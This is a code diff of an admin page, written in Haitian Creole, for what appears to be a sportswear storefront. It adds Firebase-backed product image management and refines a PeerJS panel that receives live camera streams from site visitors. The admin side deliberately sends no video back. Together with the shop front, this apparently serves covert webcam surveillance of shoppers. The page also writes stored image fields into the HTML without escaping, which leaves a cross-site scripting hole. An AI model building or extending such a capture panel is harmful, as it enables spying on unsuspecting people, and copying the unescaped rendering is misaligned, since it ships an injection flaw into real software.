@@ -3,18 +3,106 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin - Wè Visitor yo</title>
+<title>Admin — Jesyon</title>
 <style>
-  * { box-sizing: border-box; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: #111; color: white; font-family: system-ui, sans-serif;
-    padding: 20px; margin: 0; min-height: 100vh;
+    background: #0d0d0d; color: white;
+    font-family: system-ui, sans-serif;
+    padding: 15px; min-height: 100vh;
   }
-  h1 { text-align: center; color: #00cc66; margin-bottom: 5px; }
-  #status { text-align: center; color: #ccc; font-size: 14px; margin-bottom: 20px; }
+  h1 { text-align: center; color: #00cc66; font-size: 1.3rem; margin-bottom: 5px; }
+  #status { text-align: center; color: #ccc; font-size: 13px; margin-bottom: 15px; }
+
+  /* ===== TAB ===== */
+  .tabs {
+    display: flex; gap: 5px; max-width: 600px;
+    margin: 0 auto 15px;
+  }
+  .tab {
+    flex: 1; padding: 12px; background: #1c1c1c;
+    color: #ccc; border: 1px solid #333;
+    border-radius: 8px; cursor: pointer; font-size: 13px;
+    font-family: system-ui, sans-serif;
+  }
+  .tab.active { background: #00cc66; color: white; border-color: #00cc66; }
+
+  /* ===== FÒM ===== */
+  .form-card {
+    background: #1c1c1c; border-radius: 12px; padding: 15px;
+    max-width: 600px; margin: 0 auto 15px;
+    border: 1px solid #333;
+  }
+  .form-card h2 {
+    color: #00cc66; font-size: 1rem; margin-bottom: 12px;
+  }
+  .form-group { margin-bottom: 10px; }
+  .form-group label {
+    display: block; font-size: 12px; color: #aaa;
+    margin-bottom: 4px;
+  }
+  .form-group input {
+    width: 100%; padding: 12px; border-radius: 8px;
+    border: 1px solid #333; background: #0d0d0d;
+    color: white; font-size: 14px;
+    font-family: system-ui, sans-serif;
+  }
+  .form-group input:focus {
+    outline: none; border-color: #00cc66;
+  }
+  .btn {
+    width: 100%; padding: 14px; border-radius: 10px;
+    border: none; color: white; cursor: pointer;
+    font-size: 14px; font-weight: bold;
+    font-family: system-ui, sans-serif;
+    background: #00cc66;
+  }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  /* ===== APERÇU ===== */
+  #preview {
+    margin-top: 10px; text-align: center;
+  }
+  #preview img {
+    max-width: 150px; max-height: 150px;
+    border-radius: 8px; border: 1px solid #333;
+  }
+
+  /* ===== LIS IMAJ ===== */
+  .img-list {
+    max-width: 600px; margin: 0 auto;
+    display: grid; grid-template-columns: repeat(3, 1fr);
+    gap: 5px;
+  }
+  .img-item {
+    position: relative; aspect-ratio: 1/1;
+    border-radius: 6px; overflow: hidden;
+    background: #1c1c1c;
+  }
+  .img-item img {
+    width: 100%; height: 100%; object-fit: cover; display: block;
+  }
+  .img-item .del {
+    position: absolute; top: 3px; right: 3px;
+    width: 26px; height: 26px; border-radius: 50%;
+    background: #cc3333; color: white; border: none;
+    font-size: 15px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    z-index: 5;
+  }
+  .img-item .info {
+    position: absolute; bottom: 0; left: 0; right: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+    padding: 14px 4px 4px;
+    font-size: 9px; text-align: center;
+    text-transform: uppercase;
+  }
+  .img-item .info .price { color: #00cc66; font-weight: bold; display: block; margin-top: 2px; }
+
+  /* ===== VISITORS ===== */
   .visitor-list {
     display: flex; flex-wrap: wrap; gap: 8px;
-    justify-content: center; margin-bottom: 20px;
+    justify-content: center; margin-bottom: 15px;
   }
   .visitor-btn {
     background: #1c1c1c; color: #ccc; border: 1px solid #333;
@@ -25,8 +113,8 @@
   }
   #videoGrid {
     display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-    gap: 15px; margin-top: 20px;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 12px; max-width: 1200px; margin: 0 auto;
   }
   .video-card {
     background: #1c1c1c; border-radius: 12px; padding: 10px;
@@ -37,11 +125,12 @@
     box-shadow: 0 0 20px rgba(0, 204, 102, 0.4);
   }
   .video-card video {
-    width: 100%; border-radius: 8px; background: #000; display: block;
-    min-height: 180px;
+    width: 100%; border-radius: 8px; background: #000;
+    display: block; min-height: 180px;
   }
   .video-card p {
-    margin-top: 8px; font-size: 12px; color: #999; word-break: break-all;
+    margin-top: 8px; font-size: 12px; color: #999;
+    word-break: break-all;
   }
   .live-dot {
     position: absolute; top: 18px; left: 18px;
@@ -50,37 +139,200 @@
     z-index: 5;
   }
   @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+
   .empty {
-    text-align: center; color: #666; padding: 40px 20px;
-    grid-column: 1 / -1;
+    text-align: center; color: #666; padding: 30px;
+    font-size: 13px; grid-column: 1 / -1;
   }
+  .hidden { display: none; }
 </style>
 </head>
 <body>
 
-  <h1>🎥 Visitor yo an Dirèk</h1>
-  <p id="status">⏳ Ap konekte ak sèvè a...</p>
-  <div class="visitor-list" id="visitorList"></div>
-  <div id="videoGrid">
-    <div class="empty">Ap tann visitor yo konekte...</div>
+  <h1>🎥 Admin — Jesyon</h1>
+  <p id="status">⏳ Ap konekte...</p>
+
+  <!-- ===== TAB ===== -->
+  <div class="tabs">
+    <button class="tab active" id="tabVisitors">👁 Visitors</button>
+    <button class="tab" id="tabImages">🖼 Imaj</button>
+  </div>
+
+  <!-- ===== TAB VISITORS ===== -->
+  <div id="visitorsView">
+    <div class="visitor-list" id="visitorList"></div>
+    <div id="videoGrid">
+      <div class="empty">Ap tann visitor yo konekte...</div>
+    </div>
+  </div>
+
+  <!-- ===== TAB IMAJ ===== -->
+  <div id="imagesView" class="hidden">
+    <div class="form-card">
+      <h2>➕ Ajoute yon imaj</h2>
+      <div class="form-group">
+        <label>URL imaj la</label>
+        <input type="url" id="imgUrl" placeholder="https://...">
+      </div>
+      <div class="form-group">
+        <label>Non pwodwi a</label>
+        <input type="text" id="imgName" placeholder="Chòt Foutbòl">
+      </div>
+      <div class="form-group">
+        <label>Pri</label>
+        <input type="text" id="imgPrice" placeholder="$25">
+      </div>
+      <div id="preview"></div>
+      <button class="btn" id="btnAdd" style="margin-top:10px;">Ajoute Imaj</button>
+    </div>
+
+    <div class="form-card">
+      <h2>📋 Lis imaj yo (<span id="imgCount">0</span>)</h2>
+      <div class="img-list" id="imgList">
+        <div class="empty">Pa gen imaj ankò</div>
+      </div>
+    </div>
   </div>
 
 <script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
 <script>
+/* ============================================
+   KONFIGIRASYON FIREBASE
+   ============================================ */
+const firebaseConfig = {
+  apiKey: "AIzaSyBLIrjwXzJJKIWGbqblXXBop7DnfmobKH0",
+  authDomain: "style-sportif.firebaseapp.com",
+  databaseURL: "https://style-sportif-default-rtdb.firebaseio.com",
+  projectId: "style-sportif",
+  storageBucket: "style-sportif.firebasestorage.app",
+  messagingSenderId: "210989893646",
+  appId: "1:210989893646:web:1c8ae17b9473a75192145f"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+/* ============================================
+   TABS
+   ============================================ */
+const tabVisitors  = document.getElementById("tabVisitors");
+const tabImages    = document.getElementById("tabImages");
+const visitorsView = document.getElementById("visitorsView");
+const imagesView   = document.getElementById("imagesView");
+
+tabVisitors.onclick = () => {
+  tabVisitors.classList.add("active");
+  tabImages.classList.remove("active");
+  visitorsView.classList.remove("hidden");
+  imagesView.classList.add("hidden");
+};
+tabImages.onclick = () => {
+  tabImages.classList.add("active");
+  tabVisitors.classList.remove("active");
+  imagesView.classList.remove("hidden");
+  visitorsView.classList.add("hidden");
+};
+
+/* ============================================
+   JESYON IMAJ (Firebase)
+   ============================================ */
+const imgUrl   = document.getElementById("imgUrl");
+const imgName  = document.getElementById("imgName");
+const imgPrice = document.getElementById("imgPrice");
+const btnAdd   = document.getElementById("btnAdd");
+const imgList  = document.getElementById("imgList");
+const imgCount = document.getElementById("imgCount");
+const preview  = document.getElementById("preview");
+
+// Preview URL
+imgUrl.oninput = () => {
+  const url = imgUrl.value.trim();
+  if (url) preview.innerHTML = `<img src="${url}" onerror="this.style.display='none'">`;
+  else preview.innerHTML = "";
+};
+
+// Ajoute imaj nan Firebase
+btnAdd.onclick = async () => {
+  const url = imgUrl.value.trim();
+  const name = imgName.value.trim() || "San non";
+  const price = imgPrice.value.trim() || "";
+
+  if (!url) {
+    alert("Antre yon URL imaj.");
+    return;
+  }
+
+  btnAdd.disabled = true;
+  btnAdd.innerText = "⏳ Ap ajoute...";
+
+  try {
+    await db.ref("images").push({
+      url, name, price,
+      createdAt: Date.now()
+    });
+    imgUrl.value = "";
+    imgName.value = "";
+    imgPrice.value = "";
+    preview.innerHTML = "";
+    alert("✅ Imaj ajoute!");
+  } catch (e) {
+    console.error(e);
+    alert("❌ Erè: " + e.message);
+  } finally {
+    btnAdd.disabled = false;
+    btnAdd.innerText = "Ajoute Imaj";
+  }
+};
+
+// Ekoute chanjman nan Firebase
+db.ref("images").on("value", (snapshot) => {
+  const data = snapshot.val();
+  imgList.innerHTML = "";
+  if (!data) {
+    imgList.innerHTML = '<div class="empty">Pa gen imaj ankò</div>';
+    imgCount.innerText = "0";
+    return;
+  }
+  const entries = Object.entries(data).sort((a, b) => b[1].createdAt - a[1].createdAt);
+  imgCount.innerText = entries.length;
+  entries.forEach(([key, img]) => {
+    const div = document.createElement("div");
+    div.className = "img-item";
+    div.innerHTML = `
+      <img src="${img.url}" onerror="this.style.background='#333'">
+      <button class="del" data-key="${key}">×</button>
+      <div class="info">
+        ${img.name}
+        ${img.price ? `<span class="price">${img.price}</span>` : ""}
+      </div>
+    `;
+    imgList.appendChild(div);
+  });
+
+  // Bouton efase
+  imgList.querySelectorAll(".del").forEach(btn => {
+    btn.onclick = async () => {
+      if (!confirm("Efase imaj sa a?")) return;
+      try {
+        await db.ref("images/" + btn.dataset.key).remove();
+      } catch (e) { alert("Erè: " + e.message); }
+    };
+  });
+});
+
+/* ============================================
+   PEERJS — WÈ VISITORS
+   ============================================ */
 (() => {
   const ADMIN_PEER_ID = "admin-piyayy-2026-v2";
-
-  const grid        = document.getElementById("videoGrid");
-  const status      = document.getElementById("status");
+  const grid = document.getElementById("videoGrid");
+  const status = document.getElementById("status");
   const visitorList = document.getElementById("visitorList");
-  const visitors    = {};
+  const visitors = {};
 
-  let peer = null;
-  let reconnectTimer = null;
-
-  /* ============================================
-     STUN + TURN (esansyèl pou 4G/WiFi diferan)
-     ============================================ */
   const ICE_CONFIG = {
     iceServers: [
       { urls: "stun:stun.l.google.com:19302" },
@@ -94,39 +346,31 @@
     ]
   };
 
-  /* ============================================
-     KONEKSYON PEER
-     ============================================ */
-  function connectPeer() {
-    if (peer && !peer.destroyed) {
-      try { peer.destroy(); } catch (e) {}
-    }
+  let peer = null;
+  let reconnectTimer = null;
 
+  function connectPeer() {
+    if (peer && !peer.destroyed) { try { peer.destroy(); } catch (e) {} }
     peer = new Peer(ADMIN_PEER_ID, { config: ICE_CONFIG, debug: 1 });
 
     peer.on("open", (id) => {
       console.log("✅ Admin ID:", id);
-      status.innerText = "✅ Ou konekte. Ap tann visitor yo...";
+      status.innerText = "✅ Admin konekte. Ap tann visitors...";
       const empty = grid.querySelector(".empty");
       if (empty) empty.remove();
     });
 
     peer.on("call", handleIncomingCall);
-
-    // Resevwa mesaj "bye" nan men visitor
     peer.on("connection", (conn) => {
       conn.on("data", (data) => {
-        if (data && data.type === "bye") {
-          console.log("👋 Visitor voye bye:", conn.peer);
-          cleanupVisitor(conn.peer);
-        }
+        if (data && data.type === "bye") cleanupVisitor(conn.peer);
       });
     });
 
     peer.on("error", (err) => {
-      console.warn("Erè PeerJS:", err);
+      console.warn("PeerJS erè:", err);
       if (err.type === "unavailable-id") {
-        status.innerText = "❌ ID admin deja itilize. Ap eseye ankò nan 3s...";
+        status.innerText = "❌ ID deja itilize. Ap eseye ankò nan 3s...";
         setTimeout(connectPeer, 3000);
         return;
       }
@@ -149,14 +393,10 @@
     }, 3000);
   }
 
-  /* ============================================
-     APÈL ANTRE (visitor → admin)
-     ============================================ */
   function handleIncomingCall(call) {
     const visitorId = call.peer;
     console.log("📞 Visitor konekte:", visitorId);
 
-    // Si menm visitor deja egziste, netwaye ansyen an
     if (visitors[visitorId]) {
       try { visitors[visitorId].call.close(); } catch (e) {}
       if (visitors[visitorId].card) visitors[visitorId].card.remove();
@@ -164,10 +404,8 @@
       delete visitors[visitorId];
     }
 
-    // ✅ Reponn san voye okenn stream (visitor pa wè admin)
     call.answer();
 
-    /* --- Kreye kat videyo a --- */
     const card = document.createElement("div");
     card.className = "video-card";
     card.dataset.visitorId = visitorId;
@@ -176,9 +414,9 @@
     dot.className = "live-dot";
 
     const video = document.createElement("video");
-    video.autoplay    = true;
+    video.autoplay = true;
     video.playsInline = true;
-    video.muted       = true;
+    video.muted = true;
 
     const label = document.createElement("p");
     label.innerText = "👤 " + visitorId;
@@ -188,7 +426,6 @@
     card.appendChild(label);
     grid.appendChild(card);
 
-    /* --- Bouton nan lis anwo a --- */
     let btn = visitorList.querySelector(`[data-id="${visitorId}"]`);
     if (!btn) {
       btn = document.createElement("button");
@@ -208,16 +445,12 @@
       });
     }
 
-    // Objè visitor ak done pou watchdog
     visitors[visitorId] = {
       call, video, card, btn, stream: null,
-      lastTime: 0,
-      lastChange: Date.now(),
-      watchdog: null,
-      iceCheck: null
+      lastTime: 0, lastChange: Date.now(),
+      watchdog: null, iceCheck: null
     };
 
-    /* --- Stream rive --- */
     call.on("stream", (remoteStream) => {
       console.log("🎬 Stream rive pou:", visitorId);
       video.srcObject = remoteStream;
@@ -225,108 +458,68 @@
       visitors[visitorId].stream = remoteStream;
       visitors[visitorId].lastChange = Date.now();
 
-      // ⏱ WATCHDOG 1 : track mute / ended
       const vTrack = remoteStream.getVideoTracks()[0];
       if (vTrack) {
         vTrack.onmute = () => {
-          console.log("🔇 Track mute:", visitorId);
-          // Tann 8 segond anvan retire (pèmèt relance visitor)
           setTimeout(() => {
-            if (vTrack.muted && visitors[visitorId]) {
-              console.log("💀 Track toujou mute — retire");
-              cleanupVisitor(visitorId);
-            }
+            if (vTrack.muted && visitors[visitorId]) cleanupVisitor(visitorId);
           }, 8000);
         };
         vTrack.onended = () => {
-          console.log("⏹ Track ended:", visitorId);
-          // Tann 8 segond (visitor ka relance)
           setTimeout(() => {
             if (visitors[visitorId]) cleanupVisitor(visitorId);
           }, 8000);
         };
       }
 
-      // ⏱ WATCHDOG 2 : imaj pa avanse pandan 10 segond
       visitors[visitorId].watchdog = setInterval(() => {
         const v = visitors[visitorId];
         if (!v || !v.video) return;
-
         const t = v.video.currentTime;
         if (t === v.lastTime) {
-          const dead = Date.now() - v.lastChange;
-          if (dead > 10000) {
-            console.warn("💀 Imaj bloke depi 10s:", visitorId);
-            cleanupVisitor(visitorId);
-          }
+          if (Date.now() - v.lastChange > 10000) cleanupVisitor(visitorId);
         } else {
           v.lastTime = t;
           v.lastChange = Date.now();
         }
       }, 2000);
 
-      // ⏱ WATCHDOG 3 : ICE state
       visitors[visitorId].iceCheck = setInterval(() => {
         const v = visitors[visitorId];
         if (!v) return;
         const pc = v.call && v.call.peerConnection;
-        if (pc) {
-          const s = pc.iceConnectionState;
-          if (s === "failed" || s === "closed") {
-            console.warn("💀 ICE", s, visitorId);
-            cleanupVisitor(visitorId);
-          }
+        if (pc && (pc.iceConnectionState === "failed" || pc.iceConnectionState === "closed")) {
+          cleanupVisitor(visitorId);
         }
       }, 3000);
 
       updateStatus();
     });
 
-    call.on("close", () => {
-      console.log("📴 Call close:", visitorId);
-      // Tann 3 segond — petèt visitor ap relance
-      setTimeout(() => {
-        if (visitors[visitorId]) cleanupVisitor(visitorId);
-      }, 3000);
-    });
-
-    call.on("error", (e) => {
-      console.warn("call err:", e);
-      setTimeout(() => {
-        if (visitors[visitorId]) cleanupVisitor(visitorId);
-      }, 3000);
-    });
+    call.on("close", () => setTimeout(() => { if (visitors[visitorId]) cleanupVisitor(visitorId); }, 3000));
+    call.on("error", () => setTimeout(() => { if (visitors[visitorId]) cleanupVisitor(visitorId); }, 3000));
 
     updateStatus();
   }
 
-  /* ============================================
-     NETWAYE YON VISITOR
-     ============================================ */
-  function cleanupVisitor(visitorId) {
-    if (!visitors[visitorId]) return;
-    const v = visitors[visitorId];
-
+  function cleanupVisitor(id) {
+    if (!visitors[id]) return;
+    const v = visitors[id];
     if (v.watchdog) clearInterval(v.watchdog);
     if (v.iceCheck) clearInterval(v.iceCheck);
     if (v.stream) v.stream.getTracks().forEach(t => t.stop());
     try { v.call.close(); } catch (e) {}
-
     if (v.card) v.card.remove();
     if (v.btn)  v.btn.remove();
-
-    delete visitors[visitorId];
+    delete visitors[id];
     updateStatus();
   }
 
-  /* ============================================
-     MIZAJOU ESTATI
-     ============================================ */
   function updateStatus() {
     const count = Object.keys(visitors).length;
     status.innerText = count > 0
       ? `🟢 ${count} visitor konekte`
-      : "⏳ Ap tann visitor yo...";
+      : "✅ Admin konekte. Ap tann visitors...";
 
     if (count > 0) {
       const empty = grid.querySelector(".empty");
@@ -339,9 +532,6 @@
     }
   }
 
-  /* ============================================
-     EVÈNMAN SISTÈM
-     ============================================ */
   document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "visible") {
       if (!peer || peer.disconnected || peer.destroyed) scheduleReconnect();
@@ -349,9 +539,7 @@
   });
 
   window.addEventListener("beforeunload", () => {
-    Object.keys(visitors).forEach(id => {
-      try { visitors[id].call.close(); } catch (e) {}
-    });
+    Object.keys(visitors).forEach(id => { try { visitors[id].call.close(); } catch (e) {} });
     if (peer && !peer.destroyed) peer.destroy();
   });
 
